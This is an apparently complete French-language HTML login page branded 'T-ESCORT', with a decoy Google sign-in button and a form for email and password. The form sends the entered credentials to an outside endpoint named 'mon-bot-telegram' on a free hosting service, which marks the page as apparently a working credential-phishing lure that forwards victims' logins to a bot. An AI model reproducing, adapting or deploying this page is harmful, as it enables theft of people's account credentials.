<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>T-ESCORT</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

body {
    height: 100vh;
    background: linear-gradient(135deg, #1a1a2e, #3a0ca3, #7209b7);
    display: flex;
    justify-content: center;
    align-items: center;
    color: white;
}

.container {
    width: 350px;
    padding: 30px;
    border-radius: 15px;
    background: rgba(0,0,0,0.4);
    backdrop-filter: blur(15px);
    text-align: center;
}

.logo {
    margin-bottom: 20px;
}

.logo .t {
    color: #ff3c3c;
    font-size: 48px;
    font-style: italic;
    font-family: cursive;
}

.logo .rest {
    font-size: 40px;
    font-family: serif;
}

.title {
    margin: 20px 0;
    font-weight: bold;
    position: relative;
}

.title::after {
    content: "";
    width: 80px;
    height: 3px;
    background: #ff3c3c;
    display: block;
    margin: 5px auto;
}

.google-btn {
    background: linear-gradient(90deg, #ff7a18, #ff3c3c);
    border: none;
    padding: 12px;
    width: 100%;
    border-radius: 25px;
    color: white;
    font-weight: bold;
    cursor: pointer;
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    text-decoration: none;
    font-size: 14px;
}

.input-box {
    margin-bottom: 15px;
}

.input-box input {
    width: 100%;
    padding: 12px;
    border-radius: 10px;
    border: 2px solid #444;
    background: transparent;
    color: white;
}

.input-box input:focus {
    border-color: #ff3c3c;
    outline: none;
}

.toggle-container {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    margin: 15px 0;
}

.switch {
    position: relative;
    width: 50px;
    height: 26px;
}

.switch input {
    opacity: 0;
}

.slider {
    position: absolute;
    cursor: pointer;
    background: #444;
    border-radius: 50px;
    top: 0; left: 0; right: 0; bottom: 0;
    transition: 0.4s;
}

.slider::before {
    content: "";
    position: absolute;
    height: 20px;
    width: 20px;
    left: 3px;
    bottom: 3px;
    background: white;
    border-radius: 50%;
    transition: 0.4s;
}

.switch input:checked + .slider {
    background: linear-gradient(90deg, #ff7a18, #ff3c3c);
}

.switch input:checked + .slider::before {
    transform: translateX(24px);
}

.link {
    margin: 10px 0;
    cursor: pointer;
    text-decoration: underline;
}

.btn {
    width: 100%;
    padding: 12px;
    border-radius: 25px;
    border: none;
    margin-top: 10px;
    font-weight: bold;
    cursor: pointer;
}

.login {
    background: linear-gradient(90deg, #ff7a18, #ff3c3c);
    color: white;
}

.register {
    background: white;
    color: #333;
    text-decoration: none;
    display: block;
    margin-top: 10px;
    line-height: 25px;
}
</style>
</head>

<body>

<div class="container">
    <div class="logo">
        <span class="t">T</span><span class="rest">ESCORT</span>
    </div>

    <div class="title">S'IDENTIFIER</div>

    <a href="https://accounts.google.com" class="google-btn">
        <span>G CONNEXION AVEC GOOGLE</span>
        <span>→</span>
    </a>

    <form action="https://mon-bot-telegram-i1qm.onrender.com/login" method="POST">
        
        <div class="input-box">
            <input type="text" name="email" placeholder="Courriel / Nom d'utilisateur" required>
        </div>

        <div class="input-box">
            <input type="password" name="password" placeholder="Mot de Passe" required>
        </div>

        <div class="toggle-container">
            <label class="switch">
                <input type="checkbox" name="rememberMe" checked>
                <span class="slider"></span>
            </label>
            <span>Rester connecté(e)</span>
        </div>

        <div class="link">Mot de Passe oublié?</div>

        <button type="submit" class="btn login">S'IDENTIFIER</button>
    </form>

    <a href="#" class="btn register">ENREGISTREZ-VOUS</a>
</div>

</body>
</html>
